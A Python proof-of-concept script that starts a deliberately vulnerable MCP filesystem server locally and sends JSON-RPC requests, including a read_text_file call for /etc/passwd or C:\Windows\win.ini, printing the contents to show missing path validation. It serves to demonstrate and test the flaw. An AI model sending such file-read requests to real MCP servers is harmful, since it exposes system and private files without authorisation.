#!/usr/bin/env python3
"""
Proof of Concept: Excessive Data Exposure Vulnerability
Demonstrates unrestricted filesystem access in the vulnerable MCP Filesystem Server.

This script:
1. Launches the vulnerable server as a subprocess
2. Sends a JSON-RPC request to read a sensitive system file
3. Displays the file contents to demonstrate the vulnerability
"""

import subprocess
import json
import sys
import os
import platform

# Determine the server path and sensitive file based on OS
if platform.system() == 'Windows':
    # On Windows, try to read a sensitive system file
    sensitive_file = r"C:\Windows\win.ini"
    # Try to find the server executable
    server_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "dist", "index.js")
    if not os.path.exists(server_path):
        # Fallback: try running with ts-node if available
        server_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "index.ts")
        node_cmd = ["npx", "tsx", server_path]
    else:
        node_cmd = ["node", server_path]
else:
    # On Linux/Unix, try to read /etc/passwd
    sensitive_file = "/etc/passwd"
    server_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "dist", "index.js")
    if not os.path.exists(server_path):
        server_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), "index.ts")
        node_cmd = ["npx", "tsx", server_path]
    else:
        node_cmd = ["node", server_path]

print(f"[*] Starting vulnerable MCP Filesystem Server...")
print(f"[*] Server command: {' '.join(node_cmd)}")
print(f"[*] Target file: {sensitive_file}")
print()

# Launch the server process
try:
    server_process = subprocess.Popen(
        node_cmd,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1
    )
except Exception as e:
    print(f"[!] Error starting server: {e}")
    print(f"[!] Make sure Node.js is installed and the server is built (run 'npm run build')")
    sys.exit(1)

# Wait a moment for server to initialize
import time
time.sleep(1)

# Send initialization request
init_request = {
    "jsonrpc": "2.0",
    "id": 1,
    "method": "initialize",
    "params": {
        "protocolVersion": "2024-11-05",
        "capabilities": {},
        "clientInfo": {
            "name": "poc-client",
            "version": "1.0.0"
        }
    }
}

print("[*] Sending initialize request...")
server_process.stdin.write(json.dumps(init_request) + "\n")
server_process.stdin.flush()

# Read initialization response
try:
    init_response = server_process.stdout.readline()
    if init_response:
        print(f"[+] Server initialized: {init_response.strip()[:100]}...")
except Exception as e:
    print(f"[!] Error reading init response: {e}")

# Send initialized notification
initialized_notification = {
    "jsonrpc": "2.0",
    "method": "notifications/initialized"
}
server_process.stdin.write(json.dumps(initialized_notification) + "\n")
server_process.stdin.flush()

time.sleep(0.5)

# Send the exploit request to read a sensitive file
exploit_request = {
    "jsonrpc": "2.0",
    "id": 2,
    "method": "tools/call",
    "params": {
        "name": "read_text_file",
        "arguments": {
            "path": sensitive_file
        }
    }
}

print(f"[*] Sending exploit request to read: {sensitive_file}")
print("[!] VULNERABILITY: This request should be blocked but isn't due to disabled path validation")
print()

server_process.stdin.write(json.dumps(exploit_request) + "\n")
server_process.stdin.flush()

# Read the response
try:
    response_line = server_process.stdout.readline()
    if response_line:
        response = json.loads(response_line)
        
        if "result" in response:
            print("[+] EXPLOIT SUCCESSFUL - File contents retrieved:")
            print("=" * 70)
            
            # Extract content from response
            if "content" in response["result"]:
                content = response["result"]["content"]
                if isinstance(content, list) and len(content) > 0:
                    if "text" in content[0]:
                        print(content[0]["text"])
                    elif isinstance(content[0], str):
                        print(content[0])
                elif isinstance(content, str):
                    print(content)
            elif "structuredContent" in response["result"]:
                sc = response["result"]["structuredContent"]
                if "content" in sc:
                    print(sc["content"])
            
            print("=" * 70)
            print()
            print("[!] VULNERABILITY CONFIRMED: Server allowed access to sensitive file")
            print("[!] This demonstrates Excessive Data Exposure in the MCP Resource Layer")
        elif "error" in response:
            print(f"[!] Server returned error: {response['error']}")
            print("[*] This might indicate the vulnerability was patched or file doesn't exist")
        else:
            print(f"[?] Unexpected response: {json.dumps(response, indent=2)}")
    else:
        print("[!] No response received from server")
        # Check stderr for any errors
        stderr_output = server_process.stderr.read()
        if stderr_output:
            print(f"[!] Server stderr: {stderr_output}")
except json.JSONDecodeError as e:
    print(f"[!] Error parsing response: {e}")
    print(f"[!] Raw response: {response_line}")
except Exception as e:
    print(f"[!] Error reading response: {e}")

# Clean up
server_process.terminate()
try:
    server_process.wait(timeout=2)
except subprocess.TimeoutExpired:
    server_process.kill()

print()
print("[*] POC completed")

